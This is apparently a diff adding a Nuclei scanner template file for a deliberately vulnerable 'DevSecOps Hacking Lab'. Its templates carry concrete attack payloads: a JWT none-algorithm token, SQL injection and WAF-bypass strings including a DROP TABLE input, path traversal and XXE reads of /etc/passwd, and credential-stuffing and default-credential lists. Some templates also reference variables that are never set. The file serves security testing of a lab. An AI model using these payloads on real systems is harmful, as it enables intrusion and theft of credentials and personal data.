@@ -1,0 +1,543 @@
+# Nuclei Custom Templates for DevSecOps Hacking Lab
+
+id: devsecops-lab-vulnerabilities
+info:
+  name: DevSecOps Lab - All Vulnerabilities
+  author: DevSecOps Team
+  severity: info
+  description: Comprehensive vulnerability scan for DevSecOps Hacking Lab
+  tags: devsecops,jwt,idor,sqli,ratelimit
+
+---
+
+id: jwt-algorithm-confusion
+info:
+  name: JWT Algorithm Confusion - None Algorithm
+  author: DevSecOps Team
+  severity: high
+  description: Detects JWT none algorithm acceptance vulnerability
+  reference:
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+  tags: jwt,auth,token
+
+http:
+  - raw:
+      - |
+        POST /auth/login HTTP/1.1
+        Host: {{Hostname}}:8000
+        Content-Type: application/json
+
+        {"username":"admin","password":"admin123"}
+
+      - |
+        GET /api/profile HTTP/1.1
+        Host: {{Hostname}}:8080
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "email"
+
+    extractors:
+      - type: kval
+        kval:
+          - access_token
+
+---
+
+id: idor-user-enumeration
+info:
+  name: IDOR - User Profile Enumeration
+  author: DevSecOps Team
+  severity: high
+  description: Detects Insecure Direct Object Reference in user profiles
+  tags: idor,enumeration,authorization
+
+http:
+  - raw:
+      - |
+        GET /api/profile/{{user_id}} HTTP/1.1
+        Host: {{Hostname}}:8080
+        Authorization: Bearer {{token}}
+
+    payloads:
+      user_id:
+        - 1
+        - 2
+        - 3
+        - 4
+        - 5
+        - 10
+        - 100
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "email"
+          - "profile"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: email
+        regex:
+          - '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+
+      - type: regex
+        name: ssn
+        regex:
+          - '\d{3}-\d{2}-\d{4}'
+
+---
+
+id: rate-limit-bypass-direct-access
+info:
+  name: Rate Limit Bypass - Direct Service Access
+  author: DevSecOps Team
+  severity: medium
+  description: Detects exposed backend services bypassing gateway rate limits
+  tags: ratelimit,bypass,gateway
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}:8002/health"
+      - "{{BaseURL}}:8002/users"
+      - "{{BaseURL}}:8000/health"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "status"
+          - "healthy"
+        condition: or
+
+---
+
+id: exposed-prometheus-metrics
+info:
+  name: Exposed Prometheus Metrics
+  author: DevSecOps Team
+  severity: low
+  description: Detects publicly accessible Prometheus metrics
+  tags: exposure,metrics,prometheus
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}:9090/metrics"
+      - "{{BaseURL}}:8080/metrics"
+      - "{{BaseURL}}:8002/metrics"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "# TYPE"
+          - "# HELP"
+        condition: and
+
+    extractors:
+      - type: regex
+        regex:
+          - 'login_attempts_total.*'
+          - 'rate_limit_blocks_total.*'
+          - 'idor_attempts_total.*'
+
+---
+
+id: sql-injection-user-service
+info:
+  name: SQL Injection - User Service
+  author: DevSecOps Team
+  severity: critical
+  description: Detects SQL injection vulnerability in user service
+  tags: sqli,injection,database
+
+http:
+  - raw:
+      - |
+        GET /users?id={{payload}} HTTP/1.1
+        Host: {{Hostname}}:8002
+
+    payloads:
+      payload:
+        - "1' OR '1'='1"
+        - "1 UNION SELECT NULL,NULL,NULL--"
+        - "1; DROP TABLE users--"
+        - "1' AND 1=1--"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "syntax error"
+          - "postgresql"
+          - "pg_"
+          - "SQLSTATE"
+        condition: or
+
+---
+
+id: weak-jwt-secret
+info:
+  name: Weak JWT Secret Detection
+  author: DevSecOps Team
+  severity: critical
+  description: Attempts to brute force JWT secret with common weak secrets
+  tags: jwt,secret,bruteforce
+
+http:
+  - raw:
+      - |
+        POST /auth/login HTTP/1.1
+        Host: {{Hostname}}:8000
+        Content-Type: application/json
+
+        {"username":"admin","password":"admin123"}
+
+    extractors:
+      - type: kval
+        name: token
+        internal: true
+        kval:
+          - access_token
+
+  - raw:
+      - |
+        GET /api/profile HTTP/1.1
+        Host: {{Hostname}}:8080
+        Authorization: Bearer {{forged_token}}
+
+    payloads:
+      secret:
+        - secret
+        - password
+        - admin
+        - key
+        - jwt-secret
+        - dev-secret-key-change-in-production-this-is-not-secure
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+---
+
+id: mfa-bypass-race-condition
+info:
+  name: MFA Bypass - Race Condition
+  author: DevSecOps Team
+  severity: high
+  description: Detects MFA race condition vulnerability
+  tags: mfa,race-condition,2fa
+
+http:
+  - raw:
+      - |
+        POST /auth/login HTTP/1.1
+        Host: {{Hostname}}:8000
+        Content-Type: application/json
+
+        {"username":"admin","password":"admin123"}
+
+      - |
+        POST /auth/mfa/verify HTTP/1.1
+        Host: {{Hostname}}:8000
+        Content-Type: application/json
+
+        {"challenge_id":"{{challenge_id}}","code":"000000"}
+
+      - |
+        POST /auth/mfa/verify HTTP/1.1
+        Host: {{Hostname}}:8000
+        Content-Type: application/json
+
+        {"challenge_id":"{{challenge_id}}","code":"000000"}
+
+    threads: 10
+    race: true
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+---
+
+id: credential-stuffing-detection
+info:
+  name: Credential Stuffing - Breach Database
+  author: DevSecOps Team
+  severity: high
+  description: Tests common leaked credentials
+  tags: credentials,breach,stuffing
+
+http:
+  - raw:
+      - |
+        POST /auth/login HTTP/1.1
+        Host: {{Hostname}}:8000
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    payloads:
+      username:
+        - admin
+        - user
+        - alice
+        - bob
+
+      password:
+        - admin123
+        - password123
+        - Welcome@2024
+        - qwerty123
+
+    attack: clusterbomb
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "access_token"
+          - "challenge_id"
+
+---
+
+id: docker-exposed-ports
+info:
+  name: Exposed Docker Service Ports
+  author: DevSecOps Team
+  severity: medium
+  description: Detects exposed internal Docker service ports
+  tags: docker,exposure,network
+
+network:
+  - inputs:
+      - data: "\n"
+    host:
+      - "{{Hostname}}"
+    port: 8000,8002,6379,9090,3000,5002
+
+    matchers:
+      - type: word
+        words:
+          - "HTTP"
+          - "redis"
+        condition: or
+
+---
+
+id: prometheus-unauth-access
+info:
+  name: Prometheus Unauthorized Access
+  author: DevSecOps Team
+  severity: medium
+  description: Detects unauthenticated Prometheus access
+  tags: prometheus,exposure,monitoring
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}:9090/graph"
+      - "{{BaseURL}}:9090/alerts"
+      - "{{BaseURL}}:9090/config"
+      - "{{BaseURL}}:9090/targets"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Prometheus"
+          - "Expression Browser"
+        condition: and
+
+---
+
+id: grafana-default-creds
+info:
+  name: Grafana Default Credentials
+  author: DevSecOps Team
+  severity: high
+  description: Tests Grafana default admin:admin credentials
+  tags: grafana,default-creds,monitoring
+
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}:3000
+        Content-Type: application/json
+
+        {"user":"admin","password":"admin"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "grafana"
+
+---
+
+id: redis-unauth-access
+info:
+  name: Redis Unauthorized Access
+  author: DevSecOps Team
+  severity: critical
+  description: Detects unauthenticated Redis access
+  tags: redis,exposure,database
+
+network:
+  - inputs:
+      - data: "PING\r\n"
+      - data: "INFO\r\n"
+      - data: "CONFIG GET *\r\n"
+    host:
+      - "{{Hostname}}"
+    port: 6379
+
+    matchers:
+      - type: word
+        words:
+          - "+PONG"
+          - "redis_version"
+
+---
+
+id: alertmanager-exposed
+info:
+  name: Alertmanager Exposed
+  author: DevSecOps Team
+  severity: medium
+  description: Detects exposed Alertmanager instance
+  tags: alertmanager,exposure,monitoring
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}:9093/#/alerts"
+      - "{{BaseURL}}:9093/api/v2/status"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Alertmanager"
+          - "cluster"
+        condition: or
+
+---
+
+id: api-gateway-waf-bypass
+info:
+  name: API Gateway WAF Bypass
+  author: DevSecOps Team
+  severity: high
+  description: Tests WAF bypass techniques
+  tags: waf,bypass,gateway
+
+http:
+  - raw:
+      - |
+        GET /api/profile?id=1%27%20OR%20%271%27=%271 HTTP/1.1
+        Host: {{Hostname}}:8080
+
+      - |
+        GET /api/profile?id=1/**/UNION/**/SELECT/**/ HTTP/1.1
+        Host: {{Hostname}}:8080
+
+      - |
+        GET /api/profile?id=1%0aUNION%0aSELECT HTTP/1.1
+        Host: {{Hostname}}:8080
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "syntax error"
+          - "database"
+        condition: or
+
+---
+
+id: path-traversal-attack
+info:
+  name: Path Traversal Detection
+  author: DevSecOps Team
+  severity: high
+  description: Detects path traversal vulnerabilities
+  tags: traversal,lfi,path
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/file?path=../../../../etc/passwd"
+      - "{{BaseURL}}/api/file?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/api/file?path=....//....//....//....//etc/passwd"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+---
+
+id: xxe-injection
+info:
+  name: XXE Injection Detection
+  author: DevSecOps Team
+  severity: high
+  description: Detects XML External Entity injection
+  tags: xxe,injection,xml
+
+http:
+  - raw:
+      - |
+        POST /api/upload HTTP/1.1
+        Host: {{Hostname}}:8080
+        Content-Type: application/xml
+
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <user><name>&xxe;</name></user>
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
